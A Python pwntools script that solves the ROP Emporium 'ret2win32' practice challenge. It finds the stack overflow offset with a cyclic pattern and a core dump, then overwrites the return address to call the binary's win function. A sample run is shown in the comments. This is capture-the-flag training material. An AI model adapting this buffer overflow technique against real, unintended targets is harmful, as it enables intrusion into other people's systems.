#!/usr/bin/env python3

# ROP Emporium - ret2win32 solution using pwntools library
# Link: https://ropemporium.com/challenge/ret2win.html
# Created by dilldylanpickle on 4-2-2023
# GitHub: https://github.com/dilldylanpickle
#
# Dependencies:
#   - Python 3.8.10
#   - Pwntools (https://github.com/Gallopsled/pwntools)
#
# dilldylanpickle@wsl:~/Exploit_Development/ROPemporium/ret2win32$ python3 ret2win32.py 
# [*] '/home/dilldylanpickle/Exploit_Development/ROPemporium/ret2win32/ret2win32'
#     Arch:     i386-32-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x8048000)
# [+] Starting local process '/home/dilldylanpickle/Exploit_Development/ROPemporium/ret2win32/ret2win32': pid 10448
# [*] ret2win by ROP Emporium
#     x86
# 
#     For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
#     What could possibly go wrong?
#     You there, may I have your input please? And don't worry about null bytes, we're using read()!
# 
#     > Thank you!
#     Well done! Here's your flag:
#     ROPE{a_placeholder_32byte_flag!}
# [+] (SUCCESS) The flag has been sucessfully captured!
# [*] Process '/home/dilldylanpickle/Exploit_Development/ROPemporium/ret2win32/ret2win32' stopped with exit code 0 (pid 10448)

import os           # Provides a way of using operating system dependent functionalities
from pwn import *   # Import Python3 library for accessing operating system functionality

def exploit(binary_path):

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)
    io = process(elf.path)

    # Get the address of the ret2win function
    ret2win_addr = elf.symbols["ret2win"]

    # Get the offset by calling the find_offset function
    offset = find_offset(binary_path)

    # Construct the payload
    payload = b'A' * offset
    payload += p32(ret2win_addr)

    # Send the payload and print the output
    io.sendline(payload)
    log.info(io.clean())
    log.success('(SUCCESS) The flag has been sucessfully captured!')

    # Close the process
    io.close()

def find_offset(binary_path):

    # Disable logging for offset calculations
    context.log_level = 'error'

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)
    io = process(elf.path)

    # Send a cyclic pattern as input to the binary
    pattern = cyclic(69)
    io.sendline(pattern)
    io.wait()           

    # Get the corefile to extract the value of the instruction pointer (eip)
    core = io.corefile
    eip = core.eip

    # Find the offset by searching for the cyclic pattern in the eip value
    offset = cyclic_find(p32(eip), n=4)

    # Close the process that calculated the offset
    io.close()

    # Enable log level and output a result
    context.log_level = 'info'

    return offset

if __name__ == '__main__':
    binary_path = './ret2win32'
    warnings.filterwarnings("ignore", category=BytesWarning)
    exploit(binary_path)

    # Create a directory called 'core' if it does not already exist
    if not os.path.exists('Core_Dumps'):
        os.makedirs('Core_Dumps')

    # Move all files with the pattern 'core.*' to the 'core' directory
    for filename in os.listdir('.'):
        if filename.startswith('core.'):
            os.rename(filename, os.path.join('Core_Dumps', filename))